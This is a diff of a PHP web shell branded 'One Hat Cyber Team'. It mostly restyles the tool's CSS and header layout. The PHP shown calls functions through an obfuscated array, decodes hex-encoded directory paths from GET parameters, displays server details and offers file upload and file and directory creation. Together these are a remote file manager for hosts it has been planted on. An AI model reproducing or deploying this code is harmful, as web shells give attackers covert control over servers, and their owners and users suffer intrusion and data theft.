@@ -65,10 +65,11 @@ html {
     margin-right: 5px!important;
     margin-bottom: 5px!important;
     margin-top: 5px!important;
-    background: #545454cc!important;
+    background: #545454!important;
     font-family: 'Kelly Slab'!important;
     border: 2px solid black!important;
     border-radius: 10px!important;
+    font-size: medium!important;
 }
 .g {
     text-align: center!important;
@@ -82,12 +83,15 @@ text-align: left;
 text-align: right;
 }
 .k {
-    font-size: xxx-large;
-    font-family: 'Satisfy';
-    text-shadow: 0px 0px 10px rgb(255 255 255);
+    text-shadow: 0px 0px 5px white!important;
 }
+.k:hover {
+    text-shadow: 0px 0px 5px black!important;
+}
+
 .x {
 text-align:center;
+
 }
 .y:hover {
 color:#fff;
@@ -109,7 +113,7 @@ font-weight: bold!important;
 .i {
     margin-bottom: 10px;
     margin-top: 10px;
-    font-size: medium;
+    font-size: medium!important;
     text-align: left;
 }
 .u {
@@ -151,8 +155,9 @@ input[type=submit] {
 input[type=submit]:hover {
     border: 2px solid lime!important;
 }
-td{
+td {
 color:#000;
+font-size: medium!important;
 }
 th {
     border-bottom: 2px solid #181818!important;
@@ -184,10 +189,11 @@ color:#fff;
 a {
 text-decoration:none;
 color:#000;
+font-size: medium;
 }
 a:hover {
-color:#fff;
-text-shadow: 0px 0px 5px rgb(0 0 0);
+color: lime;
+text-shadow: 0px 0px 5px black!important;
 }
 .m {
 margin-left: 2px;
@@ -211,6 +217,7 @@ textarea.o {
     width: 100%!important;
     border: 2px solid black!important;
     border-radius: 5px!important;
+    font-weight: bold;
 }
 input {
     background: transparent!important;
@@ -219,6 +226,7 @@ input {
     font-family: 'Kelly Slab'!important;
     border-radius: 5px!important;
     padding: 2px!important;
+    font-weight: bold;
 }
 .h {
 color:#ea2027;
@@ -228,38 +236,46 @@ tfoot {
 }
 table {
 padding-top: 10px!important;
+font-size: medium!important;
+}
+header {
+font-size: xxx-large!important;
+font-family: 'Satisfy';
+margin-top: 2px;
+text-align: center!important;
+text-shadow: 0px 0px 10px rgb(255 255 255);
 }
 </style>
 		</head>
 
 		<body>
-			<header>
-
-				<div class="q x w">
-					<a class="k" href="<?php echo basename($_SERVER['PHP_SELF']);?>">One Hat Cyber Team</a>
-				</div>
-				
-			</header>
 
 			<article>
-				<div class="i">
-					 &thinsp;&thinsp;<b>Server  :</b> 
-					<?php echo $GNJ[0]();?>
-
-					<br />
-
-					 &thinsp;&thinsp;<b>Software  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?>
+<div style="text-align:center;">
+<span><a href="<?php echo basename($_SERVER['PHP_SELF']);?>" class-"k" style="
+    font-size: 60px;
+    font-family: Satisfy;
+    margin-top: 2px;
+    text-align: center;
+">
+One Hat Cyber Team</a></span></div>
+<div style="font-size: medium!important;">
+	
+<span>Server  : <?php echo $GNJ[0]();?>
+</span>
 <br />
- &thinsp;&thinsp;<b>PHP Version  :</b> <?php echo $GNJ[1]();?>
 
-					<br />
-				 &thinsp;&thinsp;<b>IP Address :</b> 
-					<?php echo $_SERVER['SERVER_ADDR'];?>
+<span>Software  : <?php echo $_SERVER['SERVER_SOFTWARE'];?>
+</span>
+<br />
+ 
+<span>PHP Version  : <?php echo $GNJ[1]();?>
+</span>
+<br />
+			<span style:"font-size: medium!important;">IP Address : <?php echo $_SERVER['SERVER_ADDR'];?></span>
 					<br />
 
-					&thinsp;&thinsp;<b>Directory  :</b> 
-					
-					<?php
+			<span style:"font-size: medium!important;">Directory  : <?php
 					if(isset($_GET["d"])) {
 						$d = uhex($_GET["d"]);
 						$GNJ[2](uhex($_GET["d"]));
@@ -286,13 +302,14 @@ padding-top: 10px!important;
 					}
 					?>
 
-					<br />
+		</span><br />
 
 					<form method="post" enctype="multipart/form-data">
 						
 							<input type="file" name="n[]" onchange="this.form.submit()" multiple="" style="
     margin-top: 10px;
     font-weight: bold;
+    font-size: medium;
 ">
 					</form>
 
@@ -317,7 +334,7 @@ padding-top: 10px!important;
 					}
 					?>
 
-				</div>
+				
 					<?php
 					$a_ = '<table cellspacing="0" cellpadding="7" width="100%">
 						<thead>
@@ -545,8 +562,8 @@ padding-top: 10px!important;
   <tbody>
     <tr>
       <td>
-      <a class="ajx" href="?d='.hex($d).'&n" style="-webkit-appearance: button;cursor: pointer;font-size: medium;border: 1.5px solid black;border-radius: 5px;margin-top: 5px;margin-left: 5px;padding-left: 10px;padding-right: 10px;padding-bottom: 3px;background: transparent;padding-top: 1px;"><b>Add File</b></a>
-      <a class="ajx" href="?d='.hex($d).'&l" style="-webkit-appearance: button;cursor: pointer;font-size: medium;border: 1.5px solid black;border-radius: 5px;margin-top: 5px;margin-left: 5px;padding-left: 10px;padding-right: 10px;padding-bottom: 3px;background: transparent;padding-top: 1px;"><b>Add Directory</b></a>
+      <a class="ajx" href="?d='.hex($d).'&n" style="-webkit-appearance: button;cursor: pointer;font-size: medium;border: 2px solid black;border-radius: 5px;margin-top: 5px;margin-left: 5px;padding-left: 10px;padding-right: 10px;padding-bottom: 3px;background: transparent;padding-top: 1px;"><b>Add File</b></a>
+      <a class="ajx" href="?d='.hex($d).'&l" style="-webkit-appearance: button;cursor: pointer;font-size: medium;border: 2px solid black;border-radius: 5px;margin-top: 5px;margin-left: 5px;padding-left: 10px;padding-right: 10px;padding-bottom: 3px;background: transparent;padding-top: 1px;"><b>Add Directory</b></a>
       </td>
     </tr>';
 
@@ -649,7 +666,7 @@ padding-top: 10px!important;
 -webkit-appearance: button!important;
 cursor: pointer!important;
 font-size: medium!important;
-border: 1.5px solid black!important;
+border: 2px solid black!important;
 border-radius: 5px!important;
 margin-top: 5px!important;
 margin-left: 5px!important;
@@ -663,7 +680,7 @@ padding-top: 1px!important;
 -webkit-appearance: button!important;
 cursor: pointer!important;
 font-size: medium!important;
-border: 1.5px solid black!important;
+border: 2px solid black!important;
 border-radius: 5px!important;
 margin-top: 5px!important;
 margin-left: 5px!important;
@@ -684,7 +701,7 @@ padding-top: 1px!important;
 					}
 					?>
 
-			</article>
+			</div></article>
 			<?php
 			if(isset($_GET["1"])) {
 				echo $f;
